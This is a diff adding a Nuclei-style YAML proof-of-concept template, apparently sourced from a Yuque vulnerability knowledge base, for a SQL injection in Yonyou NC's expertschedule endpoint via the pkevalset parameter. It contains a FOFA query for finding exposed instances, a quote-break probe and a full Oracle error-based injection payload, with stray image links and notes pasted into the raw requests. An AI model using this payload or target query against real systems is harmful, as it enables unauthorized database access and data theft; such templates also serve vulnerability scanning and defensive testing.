@@ -1,0 +1,50 @@
+id: poc-sbfgud5rz25ugb1l
+info:
+  name: 用友NC pkevalset存在Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sbfgud5rz25ugb1l'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sbfgud5rz25ugb1l
+    fofa: product="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1'' HTTP/1.1
+
+    Content-Type: application/json
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743171071639-32741141-7842-4886-99f8-e185e127a8a5.png)
+
+    上述判断条件为响应中存在查询错误：sql且状态200，部分可用payload'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1%27)%20AND%206913=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(122)||CHR(120)||CHR(113)||(SELECT%20(CASE%20WHEN%20(6913=6913)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(120)||CHR(122)||CHR(120)||CHR(113)||CHR(62)))%20FROM%20DUAL)%20AND%20(%27REtI%27=%27REtI HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743171071860-75f993a3-55a8-4233-8ac8-e1a286cdbf9d.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
